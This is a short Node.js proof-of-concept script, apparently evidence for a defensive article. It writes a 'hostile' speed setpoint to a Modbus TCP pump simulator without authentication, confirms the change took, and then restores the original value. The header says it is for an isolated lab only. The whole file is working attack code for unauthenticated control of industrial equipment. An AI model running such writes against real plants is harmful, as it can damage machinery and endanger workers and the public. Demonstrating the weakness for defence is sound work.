/**
 * drive.js — the dangerous half, made concrete.
 *
 * A running pump is polled read-only by the HMI. This script, from any host that
 * can reach the device on the OT segment, writes the speed setpoint (holding
 * register 10 on the modbus-copilot pump sim, value = Hz x 10). No credential is
 * offered because Modbus TCP asks for none. The write lands. The pump moves.
 *
 * It reads the value first, writes a hostile setpoint, reads back to prove it took,
 * then restores the original so the lab is left as found.
 *
 * ISOLATED LAB, OWN EQUIPMENT ONLY. This is the evidence for a defensive article,
 * not a tool to point at a plant.
 */
const ModbusRTU = require('@openp4nr/modbus-serial');   // the fork node-red-contrib-modbus ships

const HOST = process.env.PUMP_HOST || '172.23.0.3';
const PORT = Number(process.env.PUMP_PORT || 5020);
const UNIT = Number(process.env.PUMP_UNIT || 1);
const REG = 10;                                          // pump speed setpoint
const HOSTILE = Number(process.env.HOSTILE || 150);     // 15.0 Hz — slam a running pump

const hz = (raw) => `${(raw / 10).toFixed(1)} Hz`;

(async () => {
  const c = new ModbusRTU();
  await c.connectTCP(HOST, { port: PORT });
  c.setID(UNIT);

  const before = (await c.readHoldingRegisters(REG, 1)).data[0];
  console.log(`BEFORE   reg10 = ${before}  (${hz(before)})`);

  await c.writeRegister(REG, HOSTILE);
  console.log(`WROTE    reg10 = ${HOSTILE}  (${hz(HOSTILE)})   <- nobody at the HMI did this`);

  const after = (await c.readHoldingRegisters(REG, 1)).data[0];
  console.log(`AFTER    reg10 = ${after}  (${hz(after)})`);

  await c.writeRegister(REG, before);
  console.log(`RESTORED reg10 = ${before}  (${hz(before)})   (lab left as found)`);

  await new Promise((r) => c.close(r));
  process.exit(0);
})().catch((e) => { console.error('ERR', e.message); process.exit(1); });
